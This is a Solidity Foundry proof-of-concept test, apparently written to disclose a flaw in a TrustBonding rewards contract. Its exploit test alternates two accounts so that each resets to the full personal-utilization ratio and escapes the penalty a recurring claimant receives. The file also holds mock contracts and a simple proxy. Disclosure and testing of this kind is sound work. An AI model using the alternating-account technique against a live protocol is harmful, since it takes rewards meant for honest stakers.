// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import { Test } from "forge-std/src/Test.sol";

import { TrustBonding } from "src/protocol/emissions/TrustBonding.sol";

contract AlternatingGraceClaimantBypass_SingleFilePOC is Test {
    uint256 internal constant WEEK = 7 days;
    uint256 internal constant EPOCH_LENGTH = 14 days;
    uint256 internal constant EMISSIONS_PER_EPOCH = 1_000 ether;
    uint256 internal constant PERSONAL_LOWER_BOUND = 2_500;
    uint256 internal constant SYSTEM_LOWER_BOUND = 5_000;
    uint256 internal constant LOCK_AMOUNT = 100 ether;

    address internal admin = makeAddr("admin");
    address internal timelock = makeAddr("timelock");
    address internal control = makeAddr("control");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    uint256 internal startTimestamp;
    uint256 internal aliceUnlock;

    MockWrappedTrust internal wtrust;
    MockMultiVault internal multiVault;
    MockSatelliteEmissionsController internal controller;
    TrustBonding internal trustBonding;

    function setUp() public {
        startTimestamp = block.timestamp;

        wtrust = new MockWrappedTrust();
        multiVault = new MockMultiVault();
        controller = new MockSatelliteEmissionsController(startTimestamp, EPOCH_LENGTH, EMISSIONS_PER_EPOCH);

        TrustBonding impl = new TrustBonding();
        trustBonding = TrustBonding(
            payable(
                address(
                    new SimpleProxy(
                        address(impl),
                        abi.encodeWithSelector(
                            TrustBonding.initialize.selector,
                            admin,
                            timelock,
                            address(wtrust),
                            EPOCH_LENGTH,
                            address(controller),
                            SYSTEM_LOWER_BOUND,
                            PERSONAL_LOWER_BOUND
                        )
                    )
                )
            )
        );

        vm.prank(timelock);
        trustBonding.setMultiVault(address(multiVault));
        controller.setTrustBonding(address(trustBonding));

        vm.deal(address(controller), 10_000 ether);

        wtrust.mint(control, 1_000 ether);
        wtrust.mint(alice, 1_000 ether);
        wtrust.mint(bob, 1_000 ether);

        _approveTrustBonding(control);
        _approveTrustBonding(alice);
        _approveTrustBonding(bob);

        _createLock(control, LOCK_AMOUNT, _calculateUnlockTime(10 weeks));

        multiVault.setTotalUtilization(1, 0);
        multiVault.setTotalUtilization(2, 1_000_000 ether);
        multiVault.setTotalUtilization(3, 2_000_000 ether);
    }

    function test_control_recurringAccountGetsReducedRewards() public {
        multiVault.setUserUtilization(control, 1, 0);
        multiVault.setUserUtilization(control, 2, 1);

        _advanceToEpoch(2);
        vm.prank(control);
        trustBonding.claimRewards(control);

        _advanceToEpoch(3);

        uint256 rawRewards = trustBonding.userEligibleRewardsForEpoch(control, 2);
        uint256 ratio = trustBonding.getPersonalUtilizationRatio(control, 2);

        assertLt(ratio, 10_000, "recurring claimant should not keep the grace ratio");

        vm.prank(control);
        trustBonding.claimRewards(control);

        uint256 claimed = trustBonding.userClaimedRewardsForEpoch(control, 2);
        assertEq(claimed, rawRewards * ratio / 10_000, "control claim mismatch");
        assertLt(claimed, rawRewards, "control claimant should be penalized");
    }

    function test_exploit_alternatingAccountsKeepResettingToMaxRatio() public {
        multiVault.setUserUtilization(control, 1, 0);
        multiVault.setUserUtilization(control, 2, 1);
        multiVault.setUserUtilization(control, 3, 2);
        multiVault.setUserUtilization(alice, 2, 1);
        multiVault.setUserUtilization(bob, 3, 1);

        _advanceToEpoch(2);

        vm.prank(control);
        trustBonding.claimRewards(control);

        aliceUnlock = _calculateUnlockTime(EPOCH_LENGTH);
        _createLock(alice, LOCK_AMOUNT, aliceUnlock);

        _advanceToEpoch(3);

        uint256 rawAliceEpoch2 = trustBonding.userEligibleRewardsForEpoch(alice, 2);
        uint256 rawControlEpoch2 = trustBonding.userEligibleRewardsForEpoch(control, 2);
        uint256 aliceRatioEpoch2 = trustBonding.getPersonalUtilizationRatio(alice, 2);
        uint256 controlRatioEpoch2 = trustBonding.getPersonalUtilizationRatio(control, 2);

        assertEq(aliceRatioEpoch2, 10_000, "fresh claimant should get full personal ratio");
        assertLt(controlRatioEpoch2, 10_000, "recurring claimant should not get grace");

        vm.prank(alice);
        trustBonding.claimRewards(alice);
        vm.prank(control);
        trustBonding.claimRewards(control);

        assertEq(
            trustBonding.userClaimedRewardsForEpoch(alice, 2),
            rawAliceEpoch2,
            "alice should claim full raw rewards in her active epoch"
        );
        assertLt(
            trustBonding.userClaimedRewardsForEpoch(control, 2),
            rawControlEpoch2,
            "control should still be utilization-limited"
        );

        _createLock(bob, LOCK_AMOUNT, _calculateUnlockTime(EPOCH_LENGTH));

        uint256 epoch4Start = startTimestamp + (4 * EPOCH_LENGTH) + 1;
        assertLt(aliceUnlock, epoch4Start, "alice lock should expire before epoch 3 ends");
        vm.warp(aliceUnlock + 1);
        vm.prank(alice);
        trustBonding.withdraw();

        _advanceToEpoch(4);

        uint256 rawBobEpoch3 = trustBonding.userEligibleRewardsForEpoch(bob, 3);
        uint256 rawControlEpoch3 = trustBonding.userEligibleRewardsForEpoch(control, 3);
        uint256 bobRatioEpoch3 = trustBonding.getPersonalUtilizationRatio(bob, 3);
        uint256 controlRatioEpoch3 = trustBonding.getPersonalUtilizationRatio(control, 3);

        assertEq(bobRatioEpoch3, 10_000, "alternate account should also reset to full ratio");
        assertLt(controlRatioEpoch3, 10_000, "recurring claimant stays penalized");

        vm.prank(bob);
        trustBonding.claimRewards(bob);
        vm.prank(control);
        trustBonding.claimRewards(control);

        assertEq(
            trustBonding.userClaimedRewardsForEpoch(bob, 3),
            rawBobEpoch3,
            "bob should claim full raw rewards after sitting out the previous epoch"
        );
        assertLt(
            trustBonding.userClaimedRewardsForEpoch(control, 3),
            rawControlEpoch3,
            "control should keep receiving reduced rewards"
        );
    }

    function _approveTrustBonding(address user) internal {
        vm.startPrank(user, user);
        wtrust.approve(address(trustBonding), type(uint256).max);
        vm.stopPrank();
    }

    function _createLock(address user, uint256 amount, uint256 unlockTime) internal {
        vm.startPrank(user, user);
        trustBonding.create_lock(amount, unlockTime);
        vm.stopPrank();
    }

    function _advanceToEpoch(uint256 epoch) internal {
        vm.warp(startTimestamp + (epoch * EPOCH_LENGTH) + 1);
    }

    function _calculateUnlockTime(uint256 duration) internal view returns (uint256) {
        uint256 rawUnlockTime = block.timestamp + duration;
        uint256 roundedUnlockTime = (rawUnlockTime / WEEK) * WEEK;

        if (roundedUnlockTime - block.timestamp < EPOCH_LENGTH) {
            roundedUnlockTime += WEEK;
        }

        return roundedUnlockTime;
    }
}

contract MockWrappedTrust {
    string public constant name = "Wrapped TRUST";
    string public constant symbol = "WTRUST";
    uint8 public constant decimals = 18;

    mapping(address account => uint256) public balanceOf;
    mapping(address owner => mapping(address spender => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockMultiVault {
    mapping(uint256 epoch => int256 utilization) internal totalUtilization;
    mapping(address user => mapping(uint256 epoch => int256 utilization)) internal userUtilization;

    function setTotalUtilization(uint256 epoch, int256 utilization) external {
        totalUtilization[epoch] = utilization;
    }

    function setUserUtilization(address user, uint256 epoch, int256 utilization) external {
        userUtilization[user][epoch] = utilization;
    }

    function getTotalUtilizationForEpoch(uint256 epoch) external view returns (int256) {
        return totalUtilization[epoch];
    }

    function getUserUtilizationInEpoch(address user, uint256 epoch) external view returns (int256) {
        return userUtilization[user][epoch];
    }
}

contract MockSatelliteEmissionsController {
    address public trustBonding;
    uint256 public immutable startTimestamp;
    uint256 public immutable epochLength;
    uint256 public immutable emissionsPerEpoch;

    constructor(uint256 _startTimestamp, uint256 _epochLength, uint256 _emissionsPerEpoch) {
        startTimestamp = _startTimestamp;
        epochLength = _epochLength;
        emissionsPerEpoch = _emissionsPerEpoch;
    }

    receive() external payable { }

    function setTrustBonding(address _trustBonding) external {
        trustBonding = _trustBonding;
    }

    function getEpochLength() external view returns (uint256) {
        return epochLength;
    }

    function getEpochTimestampEnd(uint256 epoch) external view returns (uint256) {
        return startTimestamp + ((epoch + 1) * epochLength);
    }

    function getEpochAtTimestamp(uint256 timestamp) external view returns (uint256) {
        if (timestamp <= startTimestamp) {
            return 0;
        }
        return (timestamp - startTimestamp) / epochLength;
    }

    function getEmissionsAtEpoch(uint256) external view returns (uint256) {
        return emissionsPerEpoch;
    }

    function transfer(address recipient, uint256 amount) external {
        require(msg.sender == trustBonding, "only trust bonding");
        (bool ok,) = payable(recipient).call{ value: amount }("");
        require(ok, "native transfer failed");
    }
}

contract SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = keccak256("intuition.single.file.poc.proxy.implementation");

    constructor(address implementation, bytes memory initData) payable {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation)
        }

        if (initData.length != 0) {
            (bool ok, bytes memory reason) = implementation.delegatecall(initData);
            if (!ok) {
                assembly {
                    revert(add(reason, 0x20), mload(reason))
                }
            }
        }
    }

    fallback() external payable {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            let implementation := sload(slot)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
